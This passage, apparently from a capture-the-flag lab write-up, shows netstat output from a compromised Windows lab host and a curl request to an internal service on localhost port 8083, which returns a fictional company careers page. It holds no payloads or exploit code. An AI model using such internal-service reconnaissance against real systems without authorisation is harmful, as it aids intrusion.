</span></span><span style="display:flex;"><span>TCP    <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">53</span>           <span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>:<span style="color:#bd93f9">0</span>              LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">80</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">88</span>                [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">135</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">443</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">445</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">464</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">593</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">920</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3306</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7116</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">3389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">352</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">5985</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">8083</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4612</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">9389</span>              [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2916</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">47001</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">4</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49664</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49665</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">544</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49666</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1172</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49667</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">1560</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49668</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">49670</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">2260</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55479</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55485</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">684</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">55495</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">664</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60177</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span><span style="display:flex;"><span>TCP    [::]:<span style="color:#bd93f9">60180</span>             [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7244</span>
</span></span><span style="display:flex;"><span>TCP    [::<span style="color:#bd93f9">1</span>]:<span style="color:#bd93f9">53</span>               [::]:<span style="color:#bd93f9">0</span>                 LISTENING       <span style="color:#bd93f9">7220</span>
</span></span></code></pre></div><p>Port <code>8083</code> seemed to run a a <code>internal http service</code> I previously found.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">%</span> Total    <span style="color:#ff79c6">%</span> Received <span style="color:#ff79c6">%</span> Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>     <span style="color:#bd93f9">0</span><span style="color:#ff79c6">&lt;!</span>doctype html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Required meta tags <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Bootstrap CSS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/squarely.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>common<span style="color:#ff79c6">.</span>css  <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/common.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;!--</span>navbar <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>nav <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar navbar-expand-lg navbar-dark bg-primary&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-brand&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Business<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span> data<span style="color:#ff79c6">-</span>toggle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse&#34;</span> data<span style="color:#ff79c6">-</span>target<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>controls<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>expanded<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;false&#34;</span> aria<span style="color:#ff79c6">-</span>label<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Toggle navigation&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler-icon&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse navbar-collapse&#34;</span> id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>ul <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-nav ml-auto&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item active&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Home <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sr-only&#34;</span><span style="color:#ff79c6">&gt;</span>(current)<span style="color:#ff79c6">&lt;/</span>span<span style="color:#ff79c6">&gt;&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;resume.php&#34;</span><span style="color:#ff79c6">&gt;</span>Submit Application<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Services<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>About<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>ul<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>nav<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hero-header&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background-image: url(&#39;img/business.jpg&#39;)&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;header&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>World leader <span style="color:#ff79c6">in</span> Holographic Technologies<span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>main content<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container mb-4 mt-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-8 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>h2<span style="color:#ff79c6">&gt;</span>About us<span style="color:#ff79c6">&lt;/</span>h2<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>hr<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>We are all incredibly passionated about holograms at Holography Industries<span style="color:#ff79c6">.</span> We strongly believe that we are contributing to a brighter future <span style="color:#ff79c6">for</span> humanity<span style="color:#ff79c6">.&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Life<span style="color:#f1fa8c">&#39;s all about evolution : And we are doing just that.&lt;/p&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Make a Phone call<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 align-items-center d-md-flex&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img-fluid&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/girl.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;lapi_girl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;!--</span><span style="color:#bd93f9">3</span> cards<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container-fluid mb-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row bg-light p-md-5&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/1.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Know more about us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Our Offices are currently all located <span style="color:#ff79c6">in</span> New York<span style="color:#ff79c6">.</span> If you would like to work with us, pay us a visit<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/2.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>What we <span style="color:#ff79c6">do</span>?<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Just a bunch of passionate engineers trying to make the world a better place <span style="color:#ff79c6">for</span> everyone<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/3.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Contact Us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>You can either contact us by email <span style="color:#ff79c6">or</span> by phone<span style="color:#ff79c6">.</span> HolographyTech@HolographyTechnologies<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">514</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>  <span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">1492</span>k      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#bd93f9">1664</span>k
